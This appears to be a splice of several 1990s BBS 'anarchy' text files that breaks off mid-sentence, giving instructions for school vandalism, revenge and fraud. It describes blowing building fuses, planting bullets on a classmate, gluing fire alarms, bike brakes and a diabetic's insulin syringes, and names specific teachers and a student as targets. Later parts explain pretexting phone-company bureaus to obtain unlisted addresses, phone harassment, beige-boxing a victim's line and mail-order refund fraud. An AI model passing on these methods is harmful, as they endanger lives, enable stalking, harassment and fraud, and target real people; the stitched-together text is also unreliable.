gold looking wires inside of the rubber.  You wrap how ever many 
from each side of the cord.  If you tie them all together you can blow out
the power in the entire building.  If you just tie on from each strand to-
gether you will just blow the fuse.

EX.
  ------                   
 =-     -------------------
 =-     -------------------
  ------
	You plug the cord into the wall and you will see a small 
explosion.  That means that the wires in the cord have worked and 
the fuse is gone.  You can do it more and more.  To do it as many
times as you want you have to cut down the wire everytime to get to
more of the gold wires.  

in addition to majorly fucking up yer school this can be used to either rob 
or trash your worst fucking enemies houses.


CoMpuTteR PhUn:
~~~~~~~~~~~~~~~
Because the subject of Fucking Up Yer School is so HUGE, i have decided to
include a segment from a future NEWZ LETTER. These are two of my favorite
tricks to pull on those idiot teachers who are paid at least 300% of what
they should be making. These are even better when pulled on a substitute
(hahahahahahahahhhahahahahahahahahah)  :

  In computer class it's always fun to set up the unoccupied
computers to start beeping hyterically at a certain time.  Write
a (Basic) program something like this:

  10 FOR x = 1 TO 50000
  20 NEXT x
  30 FOR y = 1 TO 10
  40   PRINT chr$(7)
  50   FOR w = 1 to 100
  60   NEXT w
  70 NEXT y
  80 END

Do this to a few of the machines and run them simultaneously.  In
a few minutes the machines will be beeping like mad and drive the
teacher up the wall.  It's really fun doing it to a substitute
teacher who doesn't know shit about computers and has to turn off
the power supply, thus ruining *everybody's* programs!

  Another great computer trick to play if yer schools 'puters don't
have any disk drives or any form of backup, is to disable the break
keys (or sequence thereof) and wait til some dork types in a long
program with an infinite loop and runs it! heheh


CoNcLuSiOn:

Well ... i hope u enjoyed my first, and F0D's first ever text phile. As
i said before our goal is to write the most informative philes possible.
Stay tuned to yer modem for up comming fileZ written by myself (Bludsync)
or my g00d friend and associate Raptor.

(Before i begin the text phile, i would like to thank The Legions of 
Lucifer for there 0UTSTANDING work in the field of anarchy. I know that 
their fileZ have been a real inspiration to me and my ass0ciates. Thank
you.)

(Oh yea, we have expanded our knowadge to the field of Magic Card stealing.
Our group realizes that this cancer spreading through our sch00ls should
be stamped out as s00n as possible. I, myself, have destroyed, hmmmmm, 
maybe 200. Once angain, thank you for your support.)

NoN-DeStRuCtIvE sHiT
~~~~~~~~~~~~~~~~~~~~
Well...this is some shit to pull when you're REALLY board. Since this stuff
doesn't really hurt anyone (physically, at least) it can be used to 
severelly piss-off those jack-asses who occupie yer sch00l. Since i am 
feeling very pissed off today, i am going to tell u, who specifically to 
do this shit to.

 Things to do with an eraser...
1. Hide it in the 'Class Idiot's desk. (Theo G.)
2. Super Glue it to the teachers desk. (Mrs. Nacimson)
3. Put tape on the side that erases... the teacher will try SO
   fucking hard to erase the board, he/she will go nuts! (Ms. Simon)
4. Tape a Snap-Pop to the erasing side. When the teacher trys to
   erase the board... *POW!* Scares the shit out of them! (Ms. Washington)
5. Put animal guts all over it! (n/a)
6. Put rubber cemment on the side you hold it on... when the teacher
   grabs the eraser.. Haha (Ms. Gillete)

 Things to do with Super Glue... (If you get strong glue this stuff
works like a charm!) Remeber: Super Glue dries in 15 Seconds FLAT!
1. Glue the light switches up... This is great!
   You will definatly need a hammer to turn the lights off (all Janitors)
2. Glue the chalk to the board! (Ms. Nachimson)
3. Glue the door handle up... The door will be locked for
   awhile! Trust me! (all Janitors)
4. Glue books to the teachers desk! (Ms. Washington)
5. Glue Pens to the wall. (Ms. B. Sullivan)
6. Glue Chairs to the floor. (Wooden floors only) (all Janitors)
7. Pour glue on the 'Dork's chair! (Theo G.)
8. Pour glue all over the Door Handle.. Super Glue is impossible
   to take off w/o Alcohol. (all Janitors)
9. If you have the type of teacher that buys coffee at 7-11 or
   AM-PM, then the cup will be made from Styro-Foam... Glue the
   base of the cup to the desk. When tries to pick up the cup, it
   will rip the cup in half, and he will get Coffee EVERYWHERE! (Ms. Simon)
10. If you have nerds in your class that have 'Pencil Cases'

WaYs To DeStRoY tHoSe FuCkInG As$hOlEs iN sCh00l
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Welp...if yer really fucking pissed-off, like i am now, you feel the need
to cause serious FUCKING damage. Not only to the sch00l, but to all that
inhabit it (teachers, students, principal, vice-pricipal). We all know 
what they teach us is total bullshit. I mean, if guidence councilers know
so much about making a g00d carrear discision, then why the fuck are they
guidence councilers?!?! Go Fig. ----- ok..now on to what u d/led this phile
for.....DESTRUCTIVE SCH00L ANARCHY!!!!!!!!!!!!!!

  Every school you will ever go to has at least one completely
annoying loser that you would just love to harass.  Compiled here
is a collection of dirty tricks to play on just such people.

  If you have a Phys Ed/Gym class, go to someones locker and
break open one of those el cheapo ball point pens, making sure that
you don't get any ink on yerself.  Now, carefully apply the thick,
dark ink to the numbers on the dudes locker dial.  Don't forget to
smear a good portion on the actuall knob also.  When he gets back
it'll be next to impossible to dial the right combination since he
can't even see the numbers!

  If you sit right in back of someone you really hate, heres a
nice little trick that can result in loads of pain to the victim.
Take a nice rubberband, preferably the thin ones, and start
twisting it for about 75 or so twists or until little knots start
to form in the rubberband (if you do a "double helix" kind of twist
the trick won't work).  Now, stretch the twisted rubberband taught
and place it on the dudes hair and let go!  Instant hair tangler.

  In computer class it's always fun to set up the unoccupied
computers to start beeping hyterically at a certain time.  Write
a (Basic) program something like this:

  10 FOR x = 1 TO 50000
  20 NEXT x
  30 FOR y = 1 TO 10
  40   PRINT chr$(7)
  50   FOR w = 1 to 100
  60   NEXT w
  70 NEXT y
  80 END

Do this to a few of the machines and run them simultaneously.  In
a few minutes the machines will be beeping like mad and drive the
teacher up the wall.  It's really fun doing it to a substitute
teacher who doesn't know shit about computers and has to turn off
the power supply, thus ruining *everybody's* programs!

  Another great computer trick to play if yer schools 'puters don't
have any disk drives or any form of backup, is to disable the break
keys (or sequence thereof) and wait til some dork types in a long
program with an infinite loop and runs it! heheh

  If your schools library has an electronic theft protection
machine, there's bound to be little metallic strips buried deep in
the pages of most of the books.  Try to find those little strips
by opening a book and spreading the pages apart (this takes some
time and patience).  Put the little strips in some idiot's backpack
along with a few bullets.  When he walks through the electronic
gate watch out!  He'll most likely have to empty out his backpack,
and when they find those bullets on him...heheh, expulsion city for
the dork.

  Ya know how some people like to slide down those rails in the
center of stairways?  The obvious thing to do here is to cut loose
with a big glob of spit, heavy on the mucus, right on the rail! 
If not that, take one of those "paint" pens and draw a thick line
right down the rail.  When the idiot goes to slide down it...well,
you know the rest. An ever better this to do it, super glue a small
nail upward on the railing...*OUCH*!!
 
  If you really are sick of a class, just take some gum and
stick it in the locks to the doors of that class.  Guaranteed to
prevent the entree of the teacher or anyone else until the janitor
can remove it! Also ToothPicks Work just the same, if not better.
For maximum damage break off the end of the toothpick!

  If you have typing or computer class, it's always fun to sit
in the back and pick yer nose and leave the residue on the
keyboard.  Same goes for doorknobs, locker dials, light switches
hand rails, etc...

                        Shalom.

CyAnOaCrYlAtE (boy, that was a hard one to spell!)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ah, that wondrous compund, cyanoacrylate. Many, many companiesmake the 
stuff but we all affectionately refer to it as KRAZY GLUE.

In this file, it shall be demonstrated that it is possible to sabotage 
nearly ANYTHING with Krazy Glue. HAVE FUN FUCKING EVERYONE OVER!!!!

- Krazy Glue someone's doors and 
  windows shut.
- Krazy Glue someone's school locker
  shut...only while ALL his books are
  in it.
- Krazy Glue someone's gym or pool
  locker shut...only while his clothes
  are in it.
- Krazy Glue that dick of a teacher or
  prof into his office or classroom.
  This is better done to a second floor
  or higher room.
- Krazy Glue the clappers on all the
  fire bells in your school fixed.
  (thanx to a PIPELINE user for this
  one)
- Krazy Glue the mike switch and power
  switch of your school's PA system on.
  Then you can hear what REALLY goes on
  in there...All day!
- If you can get into his car, Krazy
  Glue your favorite dick's steering
  wheel so it can't turn.
- Put a few drops of Krazy Glue in the
  keyhole of a door or the key ignition
  of a car, so the key either won't
  go in or won't turn if it does go in.
- If your school's AudioVisual 
  equipment is connected to cable, and
  if your cable system has it, Krazy
  Glue the Channel dial stuck... on
  the Porno Channel!
- Krazy Glue that Barbell to the 
  squat rack or press bench - Only
  Hercules will be able to lift that
  20-pound Wimp-bell!
- Krazy Glue the hands on all the
  clocks at school to 3PM or whenever
  school lets out.
- Krazy Glue your favorite dick's 
  walkman battery door SHUT. He won't
  know what happened 'til his batteries
  run down.
- Envious of your buddy's expensive-
  -looking mechanical pencil? Well,
  don't steal it cuz he'll know it's
  you. Instead, Krazy Glue the clicker
  button at the top so it won't move
  when pushed. It will then run out of
  lead VERY QUICKLY and can never be
  used again.
- Wanna REALLY fuck someone over? 
  Krazy Glue his bike's brakes OPEN
  so when he wants to stop, he can't.
  This trick can get a guy killed, so
  only use it as MORTAL revenge.
- In winter, Krazy Glue someone's
  window open.
- Krazy Glue the bell clapper on a
  phone so it can't hit the bell when
  it rings. They will wonder why no
  one is calling them and their friends
  will wonder why no one answers.
- Let a drop or two of Krazy Glue slide
  down the crack between the little
  post on the phone that goes down when
  you hang up (Not to your own fone).
  The Krazy Glue will solidify causing
  the phone to be stuck "off the hook".
- Krazy Glue your enemy's radio on a
  station he HATES; if you like, do the
  same thing to his volume control, at
  full volume.
- Krazy Glue all your enemy's (or your
  school's) light switches off.
- Krazy Glue the Teacher's briefcase
  SHUT.
- Krazy Glue the pages of your enemy's
  textbooks and notes together. White
  Glue can be substituted here.
- Krazy Glue your enemy's disk drive
  door shut.
- Put a drop of Krazy Glue inside each
  of your enemy's diskettes.
- Put a drop of Krazy Glue on the pins
  of your enemy's print head.
- Krazy Glue all your school's
  microscopes out-of-focus.
- If your enemy ever removes his shoes
  in your presence and turns his back
  on you for any reason, Krazy Glue
  the soles to the floor. Or Krazy
  Glue the laces together.
- Rearrange all those plug connectors
  on the back of your enemy's stereo,
  into a random order. Krazy Glue them
  on so they can't be put back.
- Krazy Glue the reels of your enemy's
  cassette tapes, so they won't turn.
- Krazy Glue your enemy's medicine
  cabinet shut.
- Alternatively, Krazy Glue all the
  toothpaste tubes, pill bottles, etc
  to the shelves of same med. cabinet.
- If your enemy is a diabetic and you
  want to reduce him to fear for his
  life, Krazy Glue the plungers of
  all his insulin syringes so he can't
  inject. This is also good to do to
  druggies.
- Krazy Glue your enemy's ni-cads into
  the charger. Put a few non-
  rechargeables in as well.
- Krazy Glue all your enemy's flies
  open. Krazy glue all his other
  zippers shut.
- Krazy Glue the containers in the
  enemy's fridge shut. or,
  alternatively, Krazy Glue the whole
  fridge door shut.
- Krazy Glue the enemy's bike into 18th
  gear.
- If your enemy is a shooting fan, then
  Krazy Glue the trigger of his 
  favorite gun so it won't work when
  he goes to the range. Major
  Embarrassment.
- Krazy Glue your enemy's kid's
  TransFormer so that it won't
  TransForm.
- Unplug your enemy's TV cable. Put a
  drop of Krazy Glue in that tiny hole
  in the middle of the wall jack. Don't
  bother plugging it back in, and when
  the enemy goes to plug it back in, he
  won't be able to.
- Put that asshole's favorite disks
  into one of his disk boxes. Krazy
  Glue the box SHUT.
- Krazy Glue that little rubber plug on
  the bottom of the dick's piggy bank
  ON.
- Cut a tiny (1/8") slit into the
  cunt's Hacky Sack. Through this slit,
  saturate the whole innards of the
  sack with Krazy Glue. Use a whole
  tube of the shit if you like. Your
  enemy will not even notice until he
  goes to give the footbag a good solid
  BOOT, and it will be ROCK hard by
  that time.
- Deflate the tires on your enemy's
  transportation. Krazy Glue the valves
  shut and the tires to the wheel's
  rim.
- Krazy Glue the enemy's lights into
  their sockets. Wait for them to burn
  out.
- Krazy Glue the snooze bar of the
  enemy's alarm clock so that he can't
  shut off the alarm when it goes 
  without unplugging the damn thing.
- If your enemy is rinning for prez or
  something, Krazy Glue his campaign
  posters to the walls. After the
  election is over he will be required
  to take the things down, but what if
  he can't??????
- Since Krazy Glue doesn't set too well
  under moist conditions, it is a good
  idea to substitute EPOXY for Krazy
  Glue when you glue the toilet handle
  (either your enemy's or all the 
  school's) so it can't flush.
- Krazy Glue the caps of beer bottles
  to the bottles themselves. Do this
  with a case of your enemy's beer.
- Krazy Glue buttons and joysticks of
  all the video games in that arcade 
  that you got booted out of last week.
- Krazy Glue all the beakers and test
  tubes etcetera to the shelves at your
  school's chem lab.
- Krazy Glue that asshole teacher's
  glasses folded so he can't put them
  back on.
- Saturate basketball nets with Krazy
  Glue. You will need a whole fuckload
  to do this, but it will be worth it
  when someone shoots the ball and
  it won't go thru the hoop.....
- Krazy Glue hockey pucks into one
  big long cylinder....
- Krazy Glue mailboxes shut.
- Krazy Glue blackboard erasers to the
  chalk tray.
- In winter, open window on bus (just
  before you get off) and Krazy Glue
  it there. Driver and passengers will
  freeze.
- Krazy Glue speaker cones so they
  won't make noise.
- Krazy Glue the metal flap on the coin
  return of a vending machine so it
  won't open. BONUS: Later, come by
  with some Krazy Glue SOLVENT and
  take any coins the machine tried to
  return.
- When sending letters to a stamp
  collecting enemy, send really neat,
  interesting stamps on the envelope.
  But Krazy Glue them on so he can't
  steam them off.
- Krazy Glue that stupid cat's tail to
  the pavement of Hiway 1...
- Or to its owner's front door...
- Place many drops of Krazy Glue all 
  over items of Enemy's clothing. The
  Krazy Glue will form circles about
  1 inch in diameter that are ROCK
  SOLID, basiclyfucking 'em up.
- Deflate enemy's soccer or basket
  ball. Place 1 drop of Krazy Glue in
  the inflating needle hole.

Man, i could think of a million of 'em. As of now i've only tried about
half of them, but eventually i'll try 'em all!!!!!!!!!!!!!!!!!!

                        Shalom.

     The Lunatic Phringe   --   (708)-991-4277   --    3000+ Text Files


The    word    CN/A    stands    for   Customer's  Name  and  Address ...
Your  telephone  company  has  set  up  little  bureaus  that will answer
the  telephone  all  day  and  give  numbers  out  to any authorized Bell
employees  of  the  same  city   or   any  other  city  nationwide.   The
bureau  keeps  everyone on file with  their name and address,   INCLUDING
those  that  are  unlisted.   So  if  you  have  a  phone  number and you
want  to  find  out  who  owns  it  and  where they live,   you  can  use
this  little  handy system.   In short,   it is basically  used to  get a
persons  real name and real  address through  just having a phone number!

Lets  say  you  are  constantly  being  bugged  by  some  little dick and
you  don't  know  his  name  or  address, BUT you have his phone number..
well  you  can  get  his  Name & Address  just  by  having  his telephone
number!   For  example,   lets say you have this dicks phone number,  and
it's     (212)  555-1873,     then     just     do     the     following:

Look  up  the  CN/A  Number  for  that  NPA (NPA = AREA CODE) in the list
below.   For  this  example,  the  NPA  is  212  and  the  CN/A number is
518-471-8111.  So  then  call  up the CN/A #  (During regular hours)  and
throw  a  line  like,  "Hello, This is Operator #321 from the residential
service   center  in   California.    And  I  need  to get a  CN/A  on  a
customer  at 212-555-1873. Thank You."...  Make sure not  too sound  like
a twelve year  old dork or try  and sound lame with  a really deep voice,
just try to sound as real as possible.   Okay,  if you got that far,  and
you  sound  pretty convincing,   then the CN/A operator should not in any
means,   ask questions   and you   should  get  all  the  info  you need!


Here  is a list of just about EVERY CN/A Number in the Continental United
States, this list was suppiled to Legions of Lucifer/PHUCK by LawBreaker.

     Well that's about it.  I tried to find any mistakes that
might have occured during typing, but there's bound to be one or
two around...  Two things to note here:

1> California has 2 codes listed (1659 and 2826).  The first is
for people in California, the second is for everyone else outside
of California obtaining a CNA in those area codes.

2> Michigan ALSO has two codes.  The first was the one currently
working when I last tried; the second is what the new code will
be if it hasn't been changed already...  It's a totally automated
system, so try both codes.

Intro
~~~~~
        Hi! Its NeCRoS and DaS is back from the dead! We (Fuhrer & I) were
planning on getting things started on 9/1/93, BUT things fell through.
Fuhrer did get out issues #1 and #2 and my article #0 is out there also.
Well, I'm back to write a new DaS series. We may acquire new members alomg
the way to write with us and I'm toying with some other ideas...

        This phile is part 1 of a (2/3) part series on simple ways to
wage a phreaking war on someone.

        You were a good, honest phreak. You never bothered ANYONE in
your ENTiRE life. :). But some asshole wronged you. He pissed you off,
or whatever and always follow the motto:
        "DON'T GED MAD, GET EVEN"
        So you do. And if you'd like to avoid a physical confrontation
than its time to kick their ass through the phone!
         A PHREAKING WAR!
         Phreaking wars are simple, cheap and the deadliest of all. Best
of all, you won't break any ribs or a nose!
Onward Christian soldiers!

Step 1: Find your victim's phone number
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        First of all you must have a phone number. This can be by simply
looking them up in a phone book. But if they are unlisted, you may have
some trouble obtaining a phone number. You could always ask someone,
because someone is bound to have his/her number. In the course that this
fails see Appendix I (Obtaining Unlisted Phone Numbers).

Step 2: Find out his/her address
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        To find a victim's address you must call your CN/A bureau. CN/A
stands for Customer's Name/Address. There is one (sometimes 2) CN/A
bureaus for every state. A list of CN/As will be included with this
file. Call up your CN/A and (if your not 12 years old) say something
like:
        "Hi this is Del Johnson from the Local business office. Could I
have the address of the customer at XXX-XXX-XXXX" or:
        "Hi this is Operator #213 from California, could I have the
address......"
        See? Simple.
        You now have their Phone # and address the most important pieces
of a phreaking war.

APPENDIX 1: OBTAINING UNLISTED PHONE NUMBERS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        If the above mentioned ways to get a unlisted phone number failed 
there is still a way to get. Call up your Bell Business Office and say something 
to the effect of: 
        "This is Del Johnson from repair. What do you show the LAC Number as
in the Manhattan Area (or whatever)?"
        The LAC is Loop Assignment Center. They can give you the number of a
house if you give them the street address. YOU NEED THE ADDRESS. Call up and
say something like:
        "This Del Johnson from reapir. What do you see as the number of a
house at......" This will get you the number.

APPENDIX 2:OTHER WAYS TO OBTAIN A PHONE NUMBER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Try to  break into your school's files (if you/victim are in school).
They will ALWAYS have an address and phone number.
        If you can't get the school's files try getting a snow chain list or 
some other list people get to call people in case of an emergency and the
schools close. One of your friends might have it. They will have your 
victim's phone number and address on them.

DISCLAIMER
~~~~~~~~~~
        I NOR DAS TAKE PART OF ANY RESPONSIBILITY FOR ANY ACTIONS TAKEN
        ON THE INSTRUCTION OF HEREIN TEXTS.


Part I: The Anoyance Dialer
~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Get yourself a hold of All-In-One Code Hacker. This program has
a very good annoyance dialer. Set it up and watch the victim go crazy!
Be warned though, in some states (NJ) anonymous or harassing or
threating phone calls are illegal (Like that ever stopped anyone) and
punishable up to 30 days and a $500 fine. I did know someone who was
making prank calls to someone alot and he got 30 days probation and $500
fine.
        Always remember to put *67 in front of your calls. This disables
Caller ID so no one will know who you are.
        There are a number of disadvantages to repeating prank phone calls.
For one there are new services that will allow a person to reject all calls
that would be viewed as "Private" on a Caller ID machine. And secondly Call 
Trace  can be dangerous. For $1 a person can have your number recorded at
the local carrier (only in some areas this happens) and given to your police
station. If your PoLiCe get this number 3 times they can get you. In some
areas you can get $500 fine and up to 30 days in JaiL.
        NOTE TO THE ABOVE: I'm not sure the number goes to the Gestapo,
        but I'm positive your carrier will get it.


Part II: Other good dial-up trix
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Do you have a Sound Blaster/AdLiB? If you do and you have a program 
which can record your voice then change it around your in business. Record 
your message, change your voice around and dial-up the fag you are planning
on killing. Then play the message into the phone.

Part III: The Beige-BoX Technique
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Beige boxing is one of the most simple and effective phreaking 
techniques ever invented. It can be considered the basis of boxing. So anyway
you should the victim's address (if you don't check out DaS-003 it has
info on how to get it). Now get yourself to the victim's house by
whatever means (walk, bike, car, fly, teleportation..:). Make sure you
have your Beige Box ready and make sure its night. Go up and get into
their line with your beige box. First make A TON of 900 kinky sex lines
and 976 lines :). Then if you'd really like to ridicule him get a 800
number to  a gay counseling place and when the bill comes some people
might begin to wonder about him. :).
        On some houses you can disconnect phone service from outside,
but only if they have a special type of house protecter (the box on the
outside), if you live in Montana this might not work. :). Don't forget
to visit every night and when they get a $1,000 phone bill it will be
REAL funny to see them cry.
        Also when you're at the house don't forget to order all the
services in the phone book. You can add ALOT of money to a phone bill,
and most people don't even notice it.

Part IV: Ordering Lots of Phone Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        If you don't feel like leaving the comforts of your home to run
up a lamer's phone bill, there is a simple method you can use to order
EVER SINGLE SERVICE in the phone book.
        First find your phone book and call up the customer service
center or whatever. This is usually a 800 number. You will get a really
dumb operator on the other end. I don't know but I think they put the
deaf operators and the operators that failed operator school. I've dealt
with some really dumb operators before but this goes beyond that. Be
prepared to repeat you statements a couple times before it sinks in.
        Now, make sure you have your victims number handy. When the
operator picks just tell them you would like to order a bunch of
expensive phone services that rip me off.  Just say it was all too much
of a strain on your brain. Ok, the operator will ask you for the number 
YOU are at. Hmmmmm. If they don't know where you are, why don't you just 
give them the victim's number? Be prepared to repeat the number 5 or 6 
times, so say it very slowly so you don't confuse the stupid operator.

Part V: The Beauty of Call-Foward
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Are feeling VERY vexed at your victim? Well then read on for one 
of the most dirty tricks, Call-Foward.
        NOTE TO THE ABOVE: Be very careful, if you're victim has his own 
line than you can Call-Foward that line. BUT if you Foward the house line
important calls will be fowarded to East Bubbafuck, Montana, SO if the
victim's sister is dying and has to get a call through, and is fowarded 
and dies, YOU ARE LIABLE. But that's what 911 is for, so do this anyway.
        Well then Call-Foward can be one of the dirtiest tricks in the 
book. If you are beige boxing you can do this from their home, or using 
the method described in Part IV. In any case, you now have out your phone
book, and have the option of fowarding it anywhere. Why don't you foward 
it to the local FBI office? Or the police? Or the White House?

Part VI: Conclusion
~~~~~~~~~~~~~~~~~~~
        So, in the last 2 files I have shown you how to wage a phreaking
war, in a simple, easy manner. I hope these files have shown you how to
effectively kill someone =). Until NeXT time folks.....

CONTINUING THE USE OF THIS MAGAZINE YOU ARE AGREEING TO THESE TERMS
STATED ABOVE. IF YOU DO NOT AGREE ERASE THIS FILE NOW.



III. Intro
~~~~~~~~~~
        Hey, we're back. A few things have happened since the last issue.
First, T.E.K.A.T. is our new 908 HQ! TEKAT is a real kick-ass board, give 
'em a ring.
        Also, due to technical Diffculties, I had to reformat my HD and 
couldn't recover the 2 DaS files I was working on. I had to push the 
release dates back.
        You should also pick up a Member app, included with this issue.  
It's not hard to get in and writing is fun! :). 
        Next, I have an impotent<G> announcement to make. DaS will now be
publishing a quarterly Literary magazine. This will have just about 
anything donated, BUT I WILL NOT RIP ANYTHING OFF. If you wanna contribute
call the WHQ (number at the end of this file) and leave Mad Arab (#1) 
mail. He'll accept your UL and it will be put into the mag. I'm pushing for 
April 1st as the release date.

III. The Beginnings Of The Scam
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        First of all this scam will not net you any cash. BUT it will net
you just about anything that can be ordered by the mail. Even though you 
could theoretically get anything, its best not to use this for anything 
over $500 dollars, for two reasons. One, if you're ever caught (chances 
are nil) using this to get a product costing over $500 dollars puts you 
into a new, more felonious crime catergory. Secondly, the company may 
become suspicious if they lose a whole $5000 computer through the mail and
may investigate. But don't worry, if you stick to what I say, its 
impossible to get caught, and IT VERY MAY WELL BE LEGAL. YES, LEGAL! There
is one important thing you will need though. You will need the money to 
buy the item in the first place. So don't order a $400 HD and only have 
$200 to pay for it. Steal it or take a loan for the money.
        
        Now, on with the scam. Find your self a Computer Shopper magazine
or something of the like. Begin flipping through the ads. Aha! Here's a 
nice Seagate 212 MB Hd for $250! A good deal. But first go to the phone 
and call the company. Now ask them about their return policy on lost or 
damaged items. If they don't give you your money back ON LOST ITEMS, then
just say thank you and hang up. 
        Also, this is highly important. Ask them which service they use 
when mailing items. DO NOT ACCEPT FEDERAL EXPRESS. They have that software 
tracking thingy, and the company will hunt it down. You'll never get what 
you wanted. If they use Federal Express, ask if you  can have it sent by US 
Postal Service. If you can't DON'T ORDER FROM THERE!
        Now ask them about their return policy on lost or 
damaged items. If they don't give you your money back ON LOST ITEMS, then
just say thank you and hang up. On the other hand, if they do accept or 
replace lost or damaged items, then order your HD. It should go like this:


SCENARIO 1:

YOU: [Pick up phone and dial 1-800-SUCKERS]

OPEATOR: Retard Company, How may I help you?

YOU: Yes, I'd just like to know your policy on lost or damaged items. And 
     I'd also like to know which service you use when mailing items.

OPERATOR: Well, we can't replace lost items, but we will replace damaged 
          items. We also use Federal Express.

YOU: OK, thank you. [Hang Up]

OPERATOR: YES! NOW I CAN FINISH MY NAILS IN PEACE! <G>


SCENARIO 2:


YOU: [Pick up phone and dial 1-800-SUCKERS]

OPEATOR: Retard Company, How may I help you?

YOU: Yes, I'd just like to know your policy on lost or damaged items. 
     Also, I'd like to know what company use to mail any packages.

OPERATOR: Well sir, we replace any items lost through may or arrive 
          damaged. We use Federal Express.

YOU: Is there any way you could mail the items through the US Postal 
     instead of Federal Express?

OPERATOR: Yes, you can use the postal service of your choice. 

YOU: All right then, I'd like to order Part #08678341-A, A Seagate HD...

OPERATOR: Blah, blah, blah.

Just continue with the order. Its OK to give your house address and phone
number to these people, chances of getting in trouble are close to nil. 
Still, if you're a bit paranoid, using your amazing carding skills and 
social engineering, just give a drop site and whatnot.


IV.

        Now, wait until you recieve your item. Then wait about two weeks 
after that. Call up the customer service of the company. When the operator 
comes on tell her, politely, that you ordered a product over three weeks 
ago and it still hasn't come. Go through some other bullshit and the 
operator will (if you did the above) get a replacement for your lost part.
        When you receive your replacement part there is a few things you 
can do with it. For one, you could just keep it. If you do keep it you 
have gotten 2 for the price of 1. But, in some instances, you might not 
want 2 of the item you ordered. 
        Well, now there are two things you can do. You can try and sell the 
item for a real cheap price. Using the above example of a 212 MB HD sold 
for $250 you could try and sell it for $150. This would net you a 212 MB 
HD for $100! The second thing you can do is detailed in the next section.

SCENARIO:

YOU: [Pick up phone and dial 1-800-SUCKERS]

OPERATOR: Retard Company Customer Cervix <G>, this is Tonya, how may I 
          help you?

YOU: Yes, I ordered a hard drive from your company over three weeks ago 
     and it still hasn't arrived.

OPERATOR: Well then I'll need the product conformation number to replace
          a lost object, blah, blah, blah.


        If you did everything right, you will recieve your replacement 
part through the mail soon. Don't forget to always be bright and cheery,
always be polite, and unless under very special circumstances NEVER LOSE
YOUR TEMPER! Also, if you feel they are on to you, DON'T HANG UP! There is
a section on what to do if the heat is on.


V. Getting all your money back
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        Well, if you don't want the second item you have ordered, and you
wanted this item for free in the first place, this section is for you.
        First, when you recieve your item and you're wanting your money 
back you'll have to return it because it "arrived damaged". Well, once you
have your item out, do something to break it. Using our HD, I just 
scratched the surface.
        Now, call customer service back up. Tell them you received a 
damaged item through the mail. Next, tell the operator you just want your 
money back. DON'T tell them it is a replacement of a lost item, unless 
specifically asked. You will go through all of the standard shit, and you 
will recieve your money later. Voila! You now have obtained the item of 
your choice, through the mail, COMPLETELY FREE!

SCENARIO:

YOU: [Pick up phone and dial 1-800-SUCKERS]

OPERATOR: Retard Company Customer Cervix <G>, this is Tonya, how may I 
          help you?

YOU: Yes, I ordered a hard drive from your company awile ago, and it 
     appears to have arrived damaged.

OPERATOR: What is the problem?

YOU: Well, it can't read the hard drive <or whatever product you ordered>
     and when I looked at it it seems to have a few scratches on it.

OPERATOR: Blah, blah, blah.....

        Now you go through the standard procedure or returning an item. 
Make sure you know what DOS will display the problem as, because they will
ask alot of questions on it.


VI. Risks and Such
~~~~~~~~~~~~~~~~~~
        As I said before, this may well be legal. BUT it could be 
classified as mail fraud. Now, the risk of being caught is exteremely low
and you should not expect it. How are they to know? 
        BUT, there is a risk of being screwed. The operator could, after a
little checking, give you a call back. 

SCENARIO:

PHONE: [Ring, Ring]

YOU: Hello?

OPERATOR: Mr.Hacker? This Tonya from the Retard Company. We were able to
          track down that lost item. Apparently, it was delivered to your
          house.

YOU: Hmmm... That's odd... Lemme check my garage. [2 minutes later] Aha!
     Here it is. Its been sitting in my garage for all this time and I 
     didn't even realize it. Thank you.

        There. That is how you get screwed so be very careful when choosing 
the company you are going to order from. But you really can't get caught 
doing this unless you make some incredibly stupid mistake. Some of those 
could be:

 Ordering a $6000 Pentium
 Pulling this trick on the same company 5 times in the same week.

        The above mentioned way is the easiest way to get out of this. Or
you could say that your neighbor had just called and it was accidently 
delivered to his house.

VII. The Second Skam
~~~~~~~~~~~~~~~~~~~~
        There is a second skam you could pull that would also net you any
product for a lot less of the hassle of the above mentioned way, but the
risk of being caught is considerably higher.
        First you will need to use my method described above. PAY VERY 
CAREFUL ATTENTION TO THE WAY YOU REPLACE A LOST ITEM. Then, depending on
some very important factors you could just call up, duplicate the lost 
item shit and receive a replacement for an item that was never lost.
        There are some factors here that would make this VERY impractical.
First off, they could use a very sophisticated checking system for lost
items. Right there you are screwed. Or they could use an ordering 
conformation number, making it impossible to duplicate an order, because 
they are stored in a computer [You could try to hack into they're computer
to get conformation numbers and whatnot, but that's a different article.]


VIII. Conclusion
~~~~~~~~~~~~~~~~
        Well, Scam long and prosper! Hope ya use some of my suggestions 
for some very useful items. This could support you if you are at college,
just by selling scammed items.
        Also, I'm planning a few more articles, here are some of the 
planned ones: Basic Beige Boxing, Effective Social Engineering, and a few
Articles on The DMS family of CO's and how to use them to your advantage.

 What Ever Happened to the REAL Purple and Rainbow Boxes?               
                                                                        
   I read some shit awhile back that the Purple and Rainbow boxes could                                                                         
 do some amazing shit. I read that the Purple box could make all calls  
 seem like local calls to Ma Bell. I read the Rainbow box could turn an 
 ordinary phone line into a TSPS operator. Awesome right?               
   Wrong. After getting my hands on the schematics I learned the Purple 
 box added a really cool hold button to your phone, and the Rainbow box 
 did something so incredibly stupid I can't remember it.                
   These ARE NOT REAL BOXES. That is a bunch of shit. Its very sad.     
   So, does anybody has the REAL plans to the Rainbow or Purple boxes?  
 If so, U/L them to the DaS WHQ. Then, I will make an article on these  
 boxes and you will be showered with recognition.

INTRO 
~~~~~
        Ok, we're back for ish #006! There are a few things I have to put
in this intro. First, I have an update
